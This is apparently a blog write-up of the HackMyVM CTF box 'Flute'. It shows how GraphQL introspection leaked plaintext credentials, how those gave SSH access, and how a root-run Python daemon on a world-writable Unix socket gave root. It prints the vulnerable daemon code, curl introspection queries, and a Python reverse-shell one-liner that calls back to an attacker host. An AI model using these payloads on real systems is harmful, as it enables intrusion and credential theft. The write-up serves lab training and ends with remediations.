+++
date = '2026-08-18T14:25:00+03:00'
draft = false
title = 'Flute — HackMyVM'
tags = ["HackMyVM", "Linux", "GraphQL", "Apollo Server", "GraphQL Introspection", "Privilege Escalation", "Unix Socket", "SSH", "CTF Writeup"]
feature = 'feature.png'
showTableOfContents = true
+++

## Overview

Flute is a Linux-based CTF challenge running on Alpine Linux. The attack chain begins with enumerating an exposed GraphQL API running on Apollo Server, which leaks valid SSH credentials through introspection queries. After gaining initial access, I discovered a Python script running as root that listens on a world-readable Unix socket and executes arbitrary commands. By connecting to this socket, I achieved full root compromise.

## Step 1: Reconnaissance and Enumeration

The assessment began with an nmap scan against the target (192.168.56.102) to identify running services.

```
nmap -sV -sC -p- 192.168.56.102
```

```
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 64 OpenSSH 10.0 (protocol 2.0)
8888/tcp open  sun-answerbook? syn-ack ttl 64
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, JavaRMI, LSCP, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Origin: *
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18
|     ETag: W/"12-7JEJwpG8g89ii7CR/6hhfN27Q+k"
|     Date: Mon, 04 May 2026 20:59:55 GMT
|     Connection: close
|     query missing.
|   HTTPOptions: 
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Mon, 04 May 2026 20:59:55 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Mon, 04 May 2026 21:00:00 GMT
|_    Connection: close
```

**Key Findings:**

- SSH (22) allows password authentication.
- Port 8888 hosts an instance of Apollo Server, an open-source GraphQL server for Node.js.

### Port 22 — SSH

Checking the SSH port revealed that password authentication is allowed.

![](ssh-password-auth.png)

### Port 8888 — Apollo Server (GraphQL)

Port 8888 hosts an instance of Apollo Server. Apollo Server is an open-source GraphQL server that allows developers to build production-ready, self-documenting GraphQL APIs using Node.js. It is compatible with any GraphQL client and can integrate with various data sources.

![](apollo-introspection.png)

I tested the sample curl command to query the GraphQL endpoint directly.

```
curl --request POST \
  --header 'content-type: application/json' \
  --url 'http://192.168.56.102:8888/' \
  --data '{"query":"query { __typename }"}'
```

I received a valid response:

```json
{"data":{"__typename":"Query"}}
```

I then queried the full schema to enumerate all available types.

```
curl --request POST \
  --header 'content-type: application/json' \
  --url 'http://192.168.56.102:8888/' \
  --data '{"query":"{ __schema { types { name } } }"}'
```

![](schema-types.png)

The schema revealed the following types:

```json
{
  "data": {
    "__schema": {
      "types": [
        { "name": "User" },
        { "name": "String" },
        { "name": "Query" },
        { "name": "Boolean" },
        { "name": "__Schema" },
        { "name": "__Type" },
        { "name": "__TypeKind" },
        { "name": "__Field" },
        { "name": "__InputValue" },
        { "name": "__EnumValue" },
        { "name": "__Directive" },
        { "name": "__DirectiveLocation" }
      ]
    }
  }
}
```

The `User` type stood out as a custom type. I queried its fields to see what data it exposes.

```
curl --request POST \
  --header 'content-type: application/json' \
  --url 'http://192.168.56.102:8888/' \
  --data '{"query":"{ __type(name: \"User\") { fields { name } } }"}'
```

![](user-type-fields.png)

This revealed that the `User` type has two fields: `username` and `password`. I then queried the users directly.

```
curl --request POST \
  --header 'content-type: application/json' \
  --url 'http://192.168.56.102:8888/' \
  --data '{"query":"{ users { username password } }"}'
```

![](users-query.png)

```json
{
  "data": {
    "users": [
      {
        "username": "admin",
        "password": "<REDACTED>"
      },
      {
        "username": "hamelin",
        "password": "<REDACTED>"
      }
    ]
  }
}
```

The GraphQL API returned plaintext credentials for two users: `admin` and `hamelin`.

## Step 2: Initial Access

Using the obtained credentials, I tested the user `hamelin` and successfully gained SSH access into the target.

![](ssh-login.png)

### Local Enumeration

I began enumerating the target with the obtained access.

```
sudo -l
```

![](sudo-l.png)

The host OS is Alpine Linux.

![](os-info.png)

I uploaded LinPEAS to automate the enumeration process and discovered a script running as root under the `/opt` directory.

![](linpeas-process.png)

Our user has read access to the script.

![](script-content.png)

![](script-permissions.png)

## Step 3: Privilege Escalation

The script discovered by LinPEAS is a Python daemon that listens on a Unix socket file (`/tmp/ratd.sock`). Any local client that connects can send text commands:

* If it sends a message starting with `"RUN "`, the script takes everything after that and executes it as a shell command (`os.system(cmd)`), then replies `OK\n`.
* For any other message, it replies `Unknown command\n`.

It loops forever, handling one connection at a time, and it sets the socket permissions to `777`, so any local user can connect.

```python
import socket
import os

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket_path = "/tmp/ratd.sock"

if os.path.exists(socket_path):
    os.remove(socket_path)

sock.bind(socket_path)
os.chmod(socket_path, 0o777)
sock.listen(1)

print("Rat daemon running...")

while True:
    conn, _ = sock.accept()
    data = conn.recv(1024).decode()

    if data.startswith("RUN "):
        cmd = data[4:]
        os.system(cmd)   
        conn.send(b"OK\n")
    else:
        conn.send(b"Unknown command\n")

    conn.close()
```

![](socket-test.png)

I crafted a command to test if the socket executes commands as root.

```
echo -n 'RUN id' | nc -U /tmp/ratd.sock
```

The output came back as `OK`, confirming that commands are being executed as root. I proceeded to create the payload for escalation after trying multiple injections and failing.

![](escalation-attempts.png)

### Method 1: Reverse Shell

I spawned a reverse shell since the target has Python available.

```
echo 'RUN python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"' | nc -U /tmp/ratd.sock
```

![](reverse-shell-payload.png)

I used Penelope to catch the shell.

![](penelope-listener.png)

![](root-shell.png)

### Method 2: Copying the Flag

Alternatively, I copied the root flag to my current directory.

```
echo 'RUN cp /root/root.txt /home/hamelin/' | nc -U /tmp/ratd.sock
```

Then changed the permissions, granting access to the root flag.

```
echo 'RUN chmod 777 /home/hamelin/root.txt' | nc -U /tmp/ratd.sock
```

![](root-flag.png)

## Conclusion

This box demonstrated a full compromise through a chain of GraphQL misconfigurations and a poorly secured daemon:

1. An exposed GraphQL API with introspection enabled leaked plaintext user credentials.
2. Credential reuse via SSH granted initial access as `hamelin`.
3. A Python script running as root exposed a world-readable Unix socket (`/tmp/ratd.sock`) that executed arbitrary commands without authentication.
4. Connecting to the socket with a `RUN` payload yielded immediate root access.

To secure the environment, the following remediations are recommended:

- **Disable GraphQL introspection** in production environments to prevent schema enumeration.
- **Never store or return plaintext passwords** in any API response.
- **Restrict Unix socket permissions** to only the necessary user or group.
- **Avoid using `os.system()`** with unsanitized input; use `subprocess.run()` with argument lists.
- **Run services under least-privilege accounts** rather than root.
